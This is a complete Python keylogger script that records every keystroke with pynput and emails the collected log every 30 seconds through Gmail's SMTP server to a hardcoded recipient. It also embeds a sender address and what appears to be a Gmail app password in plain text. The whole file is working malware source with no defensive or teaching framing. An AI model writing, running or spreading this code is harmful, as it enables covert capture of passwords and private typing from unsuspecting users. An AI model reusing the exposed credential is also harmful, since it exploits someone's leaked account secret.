from pynput.keyboard import Key, Listener
import smtplib
import threading

# Store keystrokes
log = ""

# Email credentials (use App Passwords for Gmail)
EMAIL = "dev.iamelamaran@gmail.com"
PASSWORD = "uzjz cvpg qqwn tjwn"
TO = "maranelangovan5702@gmail.com"

# Send the email
def send_email(message):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(EMAIL, PASSWORD)
        server.sendmail(EMAIL, TO, message)
        server.quit()
        print("[+] Email sent")
    except Exception as e:
        print(f"[!] Error sending email: {e}")

# Send log every 30 seconds
def email_report():
    global log
    if log:
        send_email(log)
        log = ""
    timer = threading.Timer(30, email_report)
    timer.start()

# Log each keystroke
def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == Key.space:
            log += " "
        else:
            log += f" [{key}] "

# Start the keylogger
def start_logger():
    email_report()
    with Listener(on_press=on_press) as listener:
        listener.join()

start_logger()
